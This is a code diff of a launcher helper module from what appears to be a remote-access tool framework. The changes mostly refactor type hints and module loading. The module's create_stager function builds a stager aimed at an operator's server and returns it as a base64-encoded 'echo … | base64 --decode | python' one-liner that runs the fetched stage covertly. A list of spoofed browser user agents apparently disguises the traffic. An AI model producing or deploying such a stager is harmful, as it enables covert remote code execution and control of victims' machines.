@@ -3,7 +3,7 @@
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
 
-import importlib.util
+import imp
 import json
 import random
 import string
@@ -18,34 +18,35 @@ def get_names():
     """:return: A list of available launchers."""
     launcher_names = []
 
-    for file in listdir(path.realpath(path.dirname(__file__))):
-        if not file.endswith(".py") or file in ["__init__.py", "helper.py"]:
+    for filename in listdir(path.realpath(path.dirname(__file__))):
+        if not filename.endswith(".py") or filename in ["__init__.py", "helper.py"]:
             continue
         else:
-            launcher_names.append(file.replace(".py", "", 1))
+            print("Adding: " + filename)
+            launcher_names.append(filename.replace(".py", "", 1))
 
     return launcher_names
 
 
-def _load_module(module_name: str):
-    """Loads the module and adds it to the cache."""
-    try:
-        # "One might think that python imports are getting more and more complicated with each new version."
-        # Taken from https://stackoverflow.com/a/67692
-        module_path = path.realpath(path.join(path.dirname(__file__), module_name + ".py"))
-        spec = importlib.util.spec_from_file_location(module_name, module_path)
-        module = importlib.util.module_from_spec(spec)
+def _load_module(module_name):
+    """Loads the module and adds it to the cache.
 
-        spec.loader.exec_module(module)
-        _module_cache[module_name] = module
+    :type module_name: str
+    """
+    # Going to use imp over importlib until python decides to remove it.
+    module_path = path.realpath(path.join(path.dirname(__file__), module_name + ".py"))
+    module = imp.load_source(module_name, module_path)
 
-        return module
-    except FileNotFoundError:
-        raise ImportError("Failed to find launcher: {}".format(module_name)) from None
+    _module_cache[module_name] = module
+
+    return _module_cache[module_name]
 
 
-def _get_random_user_agent() -> str:
-    """:return: A random user agent."""
+def _get_random_user_agent():
+    """
+    :rtype: str
+    :return: A random user agent.
+    """
     # Taken from https://techblog.willshouse.com/2012/01/03/most-common-user-agents/
     user_agents = [
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15",
@@ -60,8 +61,12 @@ def _get_random_user_agent() -> str:
     return random.choice(user_agents)
 
 
-def get_random_string(size: int = random.randint(6, 15), numbers: bool = False) -> str:
-    """:return: A randomly generated string of x characters."""
+def get_random_string(size=random.randint(6, 15), numbers=False):
+    """
+    :type size: int
+    :type numbers: bool
+    :rtype: str
+    :return: A randomly generated string of x characters."""
     result = ""
 
     for i in range(0, size):
@@ -72,8 +77,13 @@ def get_random_string(size: int = random.randint(6, 15), numbers: bool = False) 
     return result
 
 
-def create_stager(server_host: str, server_port: int, loader_options: dict) -> str:
-    """:return: The stager which the launcher will execute."""
+def create_stager(server_host, server_port, loader_options):
+    """
+    :type server_host: str
+    :type server_port: int
+    :type loader_options: dict
+    :rtype: str
+    :return: The stager which the launcher will execute."""
     stager_host = "http://{}:{}".format(server_host, server_port)
 
     # Small piece of code which starts the staging process.
@@ -119,8 +129,13 @@ def create_stager(server_host: str, server_port: int, loader_options: dict) -> s
     return "echo {} | base64 --decode | python".format(b64encode(stager_code.encode()).decode())
 
 
-def generate(launcher_name: str, stager: str) -> tuple:
-    """:return: A tuple containing the file extension and code of this launcher."""
+def generate(launcher_name, stager):
+    """
+    :type launcher_name: str
+    :type stager: str
+    :return: A tuple containing the file extension and code of this launcher.
+    :rtype: tuple
+    """
     cached_launcher = _module_cache.get(launcher_name)
 
     if cached_launcher:
